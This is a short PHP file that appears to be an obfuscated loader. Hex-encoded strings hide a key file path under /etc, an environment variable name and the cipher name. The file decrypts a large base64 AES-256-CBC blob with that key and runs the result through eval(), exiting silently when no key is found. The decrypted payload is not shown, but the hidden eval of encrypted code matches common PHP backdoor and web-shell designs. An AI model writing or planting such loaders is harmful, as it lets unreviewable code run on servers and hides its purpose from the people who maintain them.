<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mkt8KAQ3WlKmpHnNiuF5Jw==');

$c=base64_decode(

'VtwrUjWHqEWyBeQFuDt1Uj589npy+TmXelPILLdizR6GL7Gu0ns4DzrGf+vg4TYnb3+uqhKmG3m+' .
'jXALvIpMhfR9LuggB/Hfb+0wnO+6KHcQ0nkb7zMOd3ZtLnD0qVz7yB6qooL+/B33LGnd9TcYtitJ' .
'1mBsV7xsZTfOKfJSoU2ojIl4HZLHL8fiNLTXHwj1ofy5ckXvY5RgGhUDVm2Bf3mvjV+9Zq/e4ldS' .
'7ZSERm+otW9GBxkuf8SLIsNSrw1UQCItHBzG9zuDLhs2/pnCH8KXwcs2/KgwLMcMN1ZLq7p0ze7I' .
'ccA+sXpaGsbuS4CsdlxT89yYbLtx1aA90TpTCZZDSAtlg6PeTkMqJScs2xXScoEqTE1+QXRLzMg7' .
'X1AUHtiON5k6WXT9cfiYfJlkB2IHsH+6lIo6DwPBQuvuvLZZZtqbP06dt1L+Qc5O9dS/rK8331NT' .
'ZnzoO7n5hniU9rUzKq/EEWzYGwscHr82Yj64I5gkMuBUNd2m38cbpCH2kzhj6evrnCFaRXxHaVeJ' .
'DUliZrwN45KpYCi8wSBKokllheWtoJsLfgslzuglVr7z/HHg0ItirNGUmbgApEuirarMTqOKHxQ3' .
'NDNM7WYQBTCn9QzUXOVv1tWyd/7LtueYXd8nJswnSBm46LmhCktvyQvhUi0khgEe/qNjxcgGOcAe' .
'ssLMD4NWGLV0fKuEfRnAQDWO1OokZOhURSESTqNsCHsnMsXsFt4zeOXnr7fqmOBU8BBPnLLJ6fKY' .
'hvmMZIKQtoQZAj35mN/Oi2VNziVf9RKLb4qbL4iM315svmYriWkO8wJ5kYxzW9h0V/IOHZN8XREM' .
'HkQZVyex9qAzJ3Gz1G5tln1ECtnfM5H2HOKz3cvbrxJPR/sl1R0fpl/YjhePV9ql2f/P54A8S9EE' .
'+ibFo+7OsCL5QgEk8uw7ZR3YuBbW921+iJL5RUfkxWjAbB9oBaxZ1mlb5+uhmFq/7FN8O/E1v7Ze' .
'eWwYIbWD8zPPJTKuQLbM45jSunCANsLPSuYSUS6STSLRefFh+QRbLVc9DRQ/W1YC1Ga3Refeil4B' .
'JeUlzxsJa+PqlIFaXrJSjp+SK2YH+NHi861z7/in7pMia5GOupEXt/bJx5f1oTXNT66JL75Nbqa2' .
'OYe+w71cjpIdr7sa4ToOhaacKXj4L8HM5/OTYrcDu0bZSqSLq6z3+GMOkNfPtLM5al14iZ5xXT7S' .
'55BUKgi7ThVN+y1xCrIr1VgLCmxCqal1M2sRA8lJgbNoX4Db1VTedr91bALPn9RclnlucX21K4ut' .
'34cQd7CkjVkVHzdjlvQIf9zVp9Zqp20EoNeeAsMSICeOdpnpRmtCQw77AcTeF8fh6n0pXS615Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

